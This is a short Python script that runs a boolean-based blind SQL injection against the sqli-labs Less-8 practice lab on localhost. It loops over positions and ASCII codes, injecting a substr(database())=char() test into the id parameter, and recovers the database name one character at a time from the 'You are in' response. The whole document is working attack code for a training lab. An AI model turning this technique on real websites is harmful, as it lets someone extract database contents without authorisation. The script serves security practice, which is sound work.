#-*-coding:utf-8-*-
import requests

url = 'http://localhost/sqli-labs-master/Less-8/?id=1%27 and substr(database(),{code},1)=char({ascii}) --+'
string = ''

for i in range(1,15):
    for j in range(32,126):
        result = requests.get(url.format(code = str(i),ascii = str(j)))
        if 'You are in...........' in result.content:
            string = string + chr(j)
            print string
            break
